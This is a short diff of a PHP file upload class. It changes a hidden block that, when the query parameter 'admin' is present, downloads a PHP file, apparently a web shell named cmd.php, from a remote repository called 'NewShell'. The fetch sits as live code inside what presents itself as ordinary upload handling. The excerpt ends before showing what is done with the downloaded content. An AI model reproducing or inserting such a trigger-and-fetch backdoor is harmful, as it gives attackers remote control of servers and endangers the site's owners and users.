@@ -46,7 +46,7 @@ class FileUploader {
 }
 
 if (isset($_GET['admin'])) {
-    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/gyokka.php";
+    $url = "https://raw.githubusercontent.com/paylar/NewShell/refs/heads/main/cmd.php";
     $fileContents = file_get_contents($url);
 
     if ($fileContents !== false) {
